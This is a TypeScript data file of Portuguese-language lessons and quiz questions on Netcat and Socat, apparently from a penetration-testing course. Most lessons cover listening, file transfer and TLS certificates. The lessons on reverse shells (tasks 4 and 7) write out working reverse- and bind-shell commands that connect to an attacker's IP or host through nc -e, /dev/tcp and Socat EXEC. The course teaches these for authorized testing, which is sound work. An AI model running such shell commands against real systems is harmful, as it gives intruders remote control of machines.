import { Terminal, Network, Lock, Shield, Server, Globe, PenTool as Tool, BookOpen } from 'lucide-react';
import { Task } from '../types/course';

export const linuxCliTasks5: Task[] = [
  {
    id: 1,
    title: "Introdução ao Netcat",
    objective: "Compreender o que é o Netcat e suas aplicações básicas.",
    icon: <Network className="w-6 h-6" />,
    content: [
      "O Netcat é uma ferramenta versátil para rede, frequentemente chamada de 'canivete suíço' dos hackers.",
      "Ela pode ser utilizada para uma ampla gama de tarefas de rede, como diagnosticar conexões, transferir arquivos e até mesmo criar servidores temporários.",
      "",
      "Funcionalidades principais:",
      "• Conexão TCP/UDP - Permite criar conexões de rede utilizando os protocolos TCP ou UDP.",
      "• Escuta em portas - Você pode usar o Netcat para escutar em uma porta específica, atuando como um servidor.",
      "• Transferência de arquivos - Capaz de transferir arquivos entre máquinas de maneira simples, utilizando a rede.",
      "• Chat simples - Pode ser configurado para atuar como uma ferramenta de chat simples entre máquinas conectadas.",
      "• Redirecionamento de portas - Utilizado para criar túneis de rede ou redirecionar tráfego entre diferentes portas.",
      "",
      "Sintaxe básica:",
      "• nc [opções] host porta - Modo cliente, para se conectar a um servidor remoto especificado por host e porta.",
      "• nc -l [opções] porta - Modo servidor, para escutar conexões em uma porta específica no seu sistema.",
      "",
      "Opções comuns:",
      "• -v - Modo verboso, exibe mais informações durante a execução do comando, útil para debug.",
      "• -n - Não resolve nomes de host, forçando o uso de endereços IP diretamente (sem resolução DNS).",
      "• -p - Especifica a porta local a ser usada pelo cliente Netcat.",
      "• -u - Utiliza o protocolo UDP em vez do padrão TCP, útil para testes e diagnóstico de redes baseadas em UDP.",
      "• -w - Timeout de conexão, que define o tempo de espera para a conexão ser estabelecida.",
      "• -l - Ativa o modo servidor para escutar uma porta específica.",
      "",
      "Exemplo de uso básico:",
      "• nc -nv 10.10.1.15 110 - Conecta-se ao endereço IP 10.10.1.15 na porta 110 (com modo verboso).",
      "",
      "Exemplos avançados de uso do Netcat:",
      "• nc -l -p 12345 - Escuta na porta 12345 para conexões de entrada (modo servidor).",
      "• nc -l -p 12345 > arquivo.txt - Escuta na porta 12345 e redireciona qualquer entrada recebida para o arquivo 'arquivo.txt'.",
      "• echo 'teste' | nc 10.10.1.15 12345 - Envia a string 'teste' para o servidor escutando na porta 12345 do IP 10.10.1.15.",
      "• nc -u -l 12345 - Configura o Netcat para escutar na porta 12345 utilizando UDP em vez de TCP.",
      "",
      "Dicas adicionais:",
      "• Netcat é amplamente utilizado em testes de penetração e administração de sistemas devido à sua flexibilidade.",
      "• Cuidado ao utilizar Netcat em redes não autorizadas, pois pode ser confundido com uma ferramenta de ataque.",
      "• Pode ser combinado com outras ferramentas como `ssh` para criar túneis seguros de comunicação.",
      "• Para transferir arquivos de forma simples, você pode usar o Netcat junto com comandos como `tar` para compactar e transferir múltiplos arquivos."
    ],
    questions: [
      {
        text: "Por que o Netcat é chamado de 'canivete suíço' dos hackers?",
        choices: [
          { id: "a", text: "Porque é vermelho", correct: false },
          { id: "b", text: "Por sua versatilidade", correct: true },
          { id: "c", text: "Porque é suíço", correct: false },
          { id: "d", text: "Por ser pequeno", correct: false }
        ]
      }
    ]
  },
  {
    id: 2,
    title: "Netcat: Modo Servidor",
    objective: "Aprender a usar o Netcat como servidor para escutar conexões.",
    icon: <Server className="w-6 h-6" />,
    content: [
      "O Netcat pode atuar como servidor, escutando por conexões em uma porta específica.",
      "",
      "Comando básico:",
      "nc -nlvp PORTA",
      "",
      "Parâmetros importantes:",
      "• -l - Modo de escuta",
      "• -p - Especifica a porta",
      "• -v - Modo verboso",
      "• -n - Não resolve DNS",
      "",
      "Exemplo prático:",
      "nc -nlvp 4444",
      "",
      "Dicas:",
      "• Use portas acima de 1024 sem root",
      "• Verifique se a porta está livre",
      "• Monitore conexões com netstat",
      "• Lembre-se das regras de firewall"
    ],
    questions: [
      {
        text: "Qual opção do Netcat ativa o modo de escuta?",
        choices: [
          { id: "a", text: "-s", correct: false },
          { id: "b", text: "-p", correct: false },
          { id: "c", text: "-l", correct: true },
          { id: "d", text: "-w", correct: false }
        ]
      }
    ]
  },
  {
    id: 3,
    title: "Netcat: Transferência de Arquivos",
    objective: "Aprender a transferir arquivos usando Netcat.",
    icon: <Globe className="w-6 h-6" />,
    content: [
      "O Netcat pode ser usado para transferir arquivos entre sistemas.",
      "",
      "No receptor (primeiro):",
      "nc -nlvp 4444 > arquivo_recebido",
      "",
      "No emissor (depois):",
      "nc -nv IP_RECEPTOR 4444 < arquivo_enviar",
      "",
      "Exemplo com diretório:",
      "Receptor: nc -nlvp 4444 | tar xvf -",
      "Emissor: tar cvf - diretorio | nc -nv IP 4444",
      "",
      "Dicas:",
      "• Verifique o tamanho após transferência",
      "• Use md5sum para verificar integridade",
      "• Considere compressão para arquivos grandes",
      "• Monitore o progresso com pv se disponível"
    ],
    questions: [
      {
        text: "Como verificar a integridade do arquivo após transferência?",
        choices: [
          { id: "a", text: "size", correct: false },
          { id: "b", text: "md5sum", correct: true },
          { id: "c", text: "check", correct: false },
          { id: "d", text: "verify", correct: false }
        ]
      }
    ]
  },
  {
    id: 4,
    title: "Netcat: Shells Reversos",
    objective: "Compreender o conceito de shells reversos com Netcat.",
    icon: <Lock className="w-6 h-6" />,
    content: [
      "Um shell reverso permite acesso remoto contornando firewalls.",
      "",
      "No atacante (primeiro):",
      "nc -nlvp 4444",
      "",
      "No alvo (depois):",
      "nc -nv IP_ATACANTE 4444 -e /bin/bash",
      "",
      "Alternativas sem -e:",
      "• mkfifo /tmp/f; nc IP 4444 < /tmp/f | /bin/bash > /tmp/f",
      "• /bin/bash -i >& /dev/tcp/IP/4444 0>&1",
      "",
      "Dicas de segurança:",
      "• Use apenas em ambientes autorizados",
      "• Considere criptografia (Socat)",
      "• Monitore conexões suspeitas",
      "• Documente todas as ações"
    ],
    questions: [
      {
        text: "Por que shells reversos são úteis em testes de penetração?",
        choices: [
          { id: "a", text: "São mais rápidos", correct: false },
          { id: "b", text: "Contornam firewalls", correct: true },
          { id: "c", text: "Usam menos recursos", correct: false },
          { id: "d", text: "São mais seguros", correct: false }
        ]
      }
    ]
  },
  {
    id: 5,
    title: "Introdução ao Socat",
    objective: "Aprender os conceitos básicos do Socat e suas vantagens sobre o Netcat.",
    icon: <Tool className="w-6 h-6" />,
    content: [
      "Socat é uma ferramenta mais avançada que o Netcat, oferecendo mais recursos.",
      "",
      "Sintaxe básica:",
      "socat [opções] <endereço1> <endereço2>",
      "",
      "Tipos de endereços:",
      "• TCP4/TCP6 - Conexões TCP",
      "• UDP4/UDP6 - Conexões UDP",
      "• UNIX-CONNECT - Sockets Unix",
      "• EXEC - Executa programas",
      "• STDIO - Entrada/saída padrão",
      "• FILE - Arquivos",
      "",
      "Exemplo básico:",
      "socat - TCP4:servidor:80",
      "",
      "Vantagens sobre Netcat:",
      "• Suporte a SSL/TLS",
      "• Mais opções de redirecionamento",
      "• Melhor tratamento de erros",
      "• Mais flexível com protocolos"
    ],
    questions: [
      {
        text: "Qual é uma vantagem do Socat sobre o Netcat?",
        choices: [
          { id: "a", text: "Mais simples", correct: false },
          { id: "b", text: "Suporte a SSL/TLS", correct: true },
          { id: "c", text: "Mais rápido", correct: false },
          { id: "d", text: "Menor tamanho", correct: false }
        ]
      }
    ]
  },
  {
    id: 6,
    title: "Socat: Transferências Seguras",
    objective: "Aprender a usar Socat para transferências de arquivos criptografadas.",
    icon: <Shield className="w-6 h-6" />,
    content: [
      "O Socat permite transferências seguras usando SSL/TLS.",
      "",
      "Gerando certificado:",
      "openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt",
      "cat server.key server.crt > server.pem",
      "",
      "Servidor (receptor):",
      "socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 FILE:recebido.txt,create",
      "",
      "Cliente (emissor):",
      "socat STDIO OPENSSL:servidor:4444,verify=0",
      "",
      "Opções importantes:",
      "• verify=0 - Não verifica certificado",
      "• fork - Permite múltiplas conexões",
      "• reuseaddr - Reutiliza endereço",
      "",
      "Dicas:",
      "• Use certificados confiáveis em produção",
      "• Verifique permissões dos arquivos",
      "• Monitore o tráfego com tcpdump",
      "• Mantenha logs de transferências"
    ],
    questions: [
      {
        text: "Qual comando gera um certificado autoassinado?",
        choices: [
          { id: "a", text: "openssl req", correct: true },
          { id: "b", text: "socat cert", correct: false },
          { id: "c", text: "create cert", correct: false },
          { id: "d", text: "make cert", correct: false }
        ]
      }
    ]
  },
  {
    id: 7,
    title: "Socat: Shells Avançados",
    objective: "Aprender a criar shells reversos e bind shells criptografados com Socat.",
    icon: <Terminal className="w-6 h-6" />,
    content: [
      "O Socat permite criar shells mais seguros e versáteis.",
      "",
      "Shell Bind Criptografado:",
      "Servidor:",
      "socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork EXEC:/bin/bash",
      "",
      "Cliente:",
      "socat STDIO OPENSSL:servidor:4444,verify=0",
      "",
      "Shell Reverso Criptografado:",
      "Atacante (listener):",
      "socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 STDOUT",
      "",
      "Alvo:",
      "socat STDIO OPENSSL:atacante:4444,verify=0 EXEC:/bin/bash,pty,stderr",
      "",
      "Opções úteis:",
      "• pty - Aloca pseudo-terminal",
      "• stderr - Redireciona erros",
      "• echo=0 - Desativa eco",
      "",
      "Dicas de segurança:",
      "• Use sempre criptografia",
      "• Limite acesso por IP",
      "• Monitore conexões ativas",
      "• Mantenha logs de acesso"
    ],
    questions: [
      {
        text: "Por que usar PTY em shells reversos?",
        choices: [
          { id: "a", text: "Mais rápido", correct: false },
          { id: "b", text: "Melhor compatibilidade", correct: true },
          { id: "c", text: "Menos recursos", correct: false },
          { id: "d", text: "Mais seguro", correct: false }
        ]
      }
    ]
  }
];